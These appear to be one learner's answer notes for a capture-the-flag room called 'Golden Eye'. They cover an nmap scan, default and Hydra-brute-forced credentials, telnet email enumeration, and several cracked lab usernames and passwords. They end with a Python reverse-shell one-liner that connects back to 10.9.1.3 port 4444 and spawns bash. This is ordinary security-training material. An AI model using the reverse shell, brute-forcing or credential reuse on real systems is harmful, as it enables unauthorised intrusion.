Golden Eye 

ip: 10.10.146.42

1. Use nmap to scan the network for all ports. How many ports are open?

nmap -sC -sV -p- -vv -A 10.10.146.42 

1.1 Take a look on the website, take a dive into the source code too and remember to inspect all scripts!

2.Who needs to make sure they update their default password?
Ans: Boris

3.Whats their password?
Ans:InvincibleHack3r

3.1. Now go use those credentials and login to a part of the site.
 Done

4. Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable? 

No answer

5. If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?
Ans: secret1!

6.Inspect port 55007, what services is configured to use this port?

ANS: telnet

 7. Login using that service and the credentials you found earlier.
No answer  needed

8. What can you find on this service?
Ans : emails


9. What user can break Boris' codes?

ANS: Natalya

10. Using the users you found on this service, find other users passwords
No answer needed

11.Keep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.
no answer needed

ANS:username: xenia
password: RCP90rulez!


username: dr_doak
password: 4England!


username: admin
password: xWinter1995x!	

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.9.1.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'  

